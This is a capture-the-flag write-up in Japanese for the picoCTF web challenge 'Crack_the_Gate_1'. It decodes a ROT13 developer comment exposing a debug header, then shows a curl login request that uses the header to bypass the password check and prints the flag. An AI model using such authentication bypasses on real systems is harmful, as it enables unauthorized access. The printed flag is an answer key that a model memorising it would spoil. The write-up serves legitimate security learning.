## [Web][Easy]Crack_the_Gate_1

We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?

## Solution

Emailが`ctf-player@picoctf.org`であることがわかっている。
パスワードはわからない。

シンプルなログインフォーム。
フォームに入力された値をJavaScriptで取得し、JSONというデータ形式に変換してサーバーへ送信する。

[form]

```html

<form id="loginForm">
        <h2 style="font-size: 24px; margin-bottom: 24px;">
            Login
        </h2>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                if (data.success) {
    prompt('Login successful!\nFlag:', data.flag);
} else {
    alert('Invalid credentials');
}

            })
            .catch(error => console.error('Error:', error));
        });
    </script>

```

さらにコメントが書いてあった。

```Html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

ROT13っぽいので復号すると

```html
<!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->
```
"X-Dev-Access: yes"を使えばバイパスできる。


`-H "X-Dev-Access: yes"`を追加しCurlを使ってPOSTする

```Bash
curl -X POST \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email": "ctf-player@picoctf.org", "password": ""}' \
  http://amiable-citadel.picoctf.net:58260/login
```

```bash
# curl -X POST \
>   -H "Content-Type: application/json" \
>   -H "X-Dev-Access: yes" \
>   -d '{"email": "ctf-player@picoctf.org", "password": ""}' \
>   http://amiable-citadel.picoctf.net:58260/login
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}
```

## Flag

```
picoCTF{brut4_f0rc4_125f752d}
```